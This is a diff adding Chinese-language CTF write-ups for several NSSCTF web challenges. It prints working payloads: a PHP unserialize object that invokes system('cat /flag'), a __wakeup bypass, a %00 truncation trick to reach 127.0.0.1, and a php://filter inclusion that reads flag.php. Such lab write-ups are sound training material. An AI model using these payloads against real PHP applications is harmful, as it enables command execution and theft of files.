@@ -497,3 +497,157 @@ http://node5.anna.nssctf.cn:27948/c0nt1nue.php?x=QLTHNDT&y=QNKCDZO
 ![alt text](image-199.png)
 然后用数组绕过就可以得到flag，这里是===强比较所以要找到md5也相同的字符串要用工具，这里九直接使用数组绕过
 ![alt text](image-200.png)
+http://node5.anna.nssctf.cn:27948/f1na11y.php
+
+## [SWPUCTF 2022 新生赛]1z_unserialize
+>url:https://www.nssctf.cn/problem/2883
+>知识点：反序列化
+
+打开题目有一段php代码
+```php
+<?php
+ 
+class lyh{
+    public $url = 'NSSCTF.com';
+    public $lt;
+    public $lly;
+     
+     function  __destruct()
+     {
+        $a = $this->lt;
+
+        $a($this->lly);
+     }
+    
+    
+}
+unserialize($_POST['nss']);
+highlight_file(__FILE__);
+ 
+ 
+?> 
+```
+简单的反序列化
+只要传参把$a变成system();$this->lly变成ls或者cat就是一个简单的命令注入了
+
+![alt text](image-201.png)
+
+然后post传参
+构造payload:
+```
+nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:2:"ls";}
+```
+
+
+![alt text](image-202.png)
+看到一个index.php,访问进去没有东西
+但是至少说明有用，然后把ls改成cat /flag
+![alt text](image-203.png)
+构造payload得到flag
+```payload
+nss=O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:9:"cat /flag";}
+```
+
+![alt text](image-204.png)
+
+## [SWPUCTF 2022 新生赛]ez_ez_unserialize
+>url:https://www.nssctf.cn/problem/3082
+>知识点：反序列化
+
+打开题目得到php代码
+```php
+<?php
+class X
+{
+    public $x = __FILE__;
+    function __construct($x)
+    {
+        $this->x = $x;
+    }
+    function __wakeup()
+    {
+        if ($this->x !== __FILE__) {
+            $this->x = __FILE__;
+        }
+    }
+    function __destruct()
+    {
+        highlight_file($this->x);
+        //flag is in fllllllag.php
+    }
+}
+if (isset($_REQUEST['x'])) {
+    @unserialize($_REQUEST['x']);
+} else {
+    highlight_file(__FILE__);
+} 
+```
+题目告诉我们flag在哪，而且类中有高亮文件方法。怎么拿flag已经很明显了。关键点在于__weakup()魔术方法固定死了我们高亮的文件。所以这题只需要绕过__weakup()。
+
+第一步先序列化
+![alt text](image-205.png)
+然后将生成的
+O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}
+修改为
+O:1:"X":2:{s:1:"x";s:13:"fllllllag.php";}
+
+构造payload
+```
+http://node5.anna.nssctf.cn:28637/?x=O:1:"X":2:{s:1:"x";s:13:"fllllllag.php";}
+```
+![alt text](image-206.png)
+
+## [GKCTF 2020]cve版签到
+>url:https://www.nssctf.cn/problem/1300
+>知识点:%00截断
+
+![alt text](image-207.png)
+打开题目一个连接，点进去也没有什么东西
+![alt text](image-208.png)
+看看网络，里面有提示
+![alt text](image-209.png)
+后缀为.ctfhub.com才能访问，但是提示说又是在127.0.0.1
+这里就要用%00截断了
+
+原理：截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。
+
+构造payload：
+```
+http://node7.anna.nssctf.cn:25053/?url=http://127.0.0.1%00.ctfhub.com
+```
+![alt text](image-210.png)
+又出现提示
+把127.0.0.1改成127.0.0.123
+```
+http://node7.anna.nssctf.cn:25053/?url=http://127.0.0.123%00.ctfhub.com
+```
+![alt text](image-211.png)
+
+## [MoeCTF 2022]baby_file
+>url:https://www.nssctf.cn/problem/3345
+>知识点：php伪协议
+
+```php
+<html>
+<title>Here's a secret. Can you find it?</title>
+<?php
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+?>
+</html> 
+```
+![alt text](image-212.png)
+直接让file=file没用
+![alt text](image-214.png)
+放在水波逐流里烧一下
+发现有flag.php
+用伪协议
+```
+http://node5.anna.nssctf.cn:25876/?file=php://filter/read=convert.base64-encode/resource=flag.php
+```
+![alt text](image-213.png)
